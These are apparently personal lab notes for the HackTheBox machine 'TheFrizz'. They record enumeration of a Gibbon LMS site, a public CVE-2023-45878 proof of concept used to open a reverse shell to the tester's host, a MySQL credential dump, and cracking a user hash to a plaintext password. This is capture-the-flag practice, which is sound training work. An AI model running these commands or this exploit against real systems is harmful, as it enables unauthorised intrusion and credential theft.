```
sudo nmap -sC -sV -vv -oN nmap-thefrizz 10.10.11.60
```
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527212119.png]]

### Enumerate Web App

Navigate to IP and actually get redirected here 

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527211840.png]]
- add this to `/etc/hosts` 

Site does appear
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527212028.png]]

#### manual enum 

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527212614.png]]
- Gibbon LMS in use: v25.0.0.00

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527212738.png]]
- php in use based on hovering over "staff applications"

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527212814.png]]
- staff login page 
- `admin:admin` didn't work
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527212852.png]]

Googled exploits for this CMS, but only seeing kind of not interesting LFI vulnerabilities
#### gobuster

```
gobuster dir -u http://frizzdc.frizz.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o gobuster 
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527214310.png]]
- nothing

#### ffuf

Save Burp request to file 
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527215504.png]]

```
ffuf -request thefrizz.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt -fs 22064

```
- nothing
### netexec 

```
netexec smb 10.10.11.60 -u '' -p '' --shares
```

this didn't work at all.

### initial access

### CVE

[CVE PoC Ref ](https://github.com/davidzzo23/CVE-2023-45878/blob/main/README.md)

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527220907.png]]
- got command execution 

#### Reverse shell 
```
python3 CVE-2023-45878.py -t frizzdc.frizz.htb -s -i 10.10.14.10 -p 9001
```
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527221155.png]]
Got reverse shell 

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527221045.png]]

### enumerate for priv esc

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527221346.png]]

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527221413.png]]

Found usernames:
f.frizzle

some rando creds nut probably default 

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527235826.png]]

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250528003810.png]]


![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250528195736.png]]

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250528200258.png]]

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250528210923.png]]

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250528211030.png]]

```
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show databases;"
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250528213407.png]]

```
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon; SHOW tables;"
```
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250528213542.png]]

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250528213727.png]]

```
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon; SELECT * from gibbonperson;" -E
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250528215711.png]]
- got f.frizzle credential
- f.frizzle@frizz.htb

Save hash as this for SHA-256 
```
f.frizzle:$dynamic_82$067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03$/aACFhikmNopqrRTVz2489
```

John 
```
john --format=dynamic='sha256($s.$p)' --wordlist=/usr/share/wordlists/rockyou.txt frizzle.hash
```

All cracked to `Jenni_Luvs_Magic23`
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250528220650.png]]

f.frizzle@frizz.htb

### Initial Access as F.Frizz

ssh f.frizzle@frizz.htb does not work. 

#### Impacket's getTGT 

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250528222752.png]]

Try this after 

####  Impacket's GetUserSPNs

```
impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
```
### ssh with kerberos key

This is supposed to work but I kept getting errors. 
```
ssh -k f.frizzle@frizz.htb
```
### netexec 
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250530214750.png]]
- cannot psexec as frizzle and no interesting shares :(
- no winrm

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250530215005.png]]

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250530215525.png]]

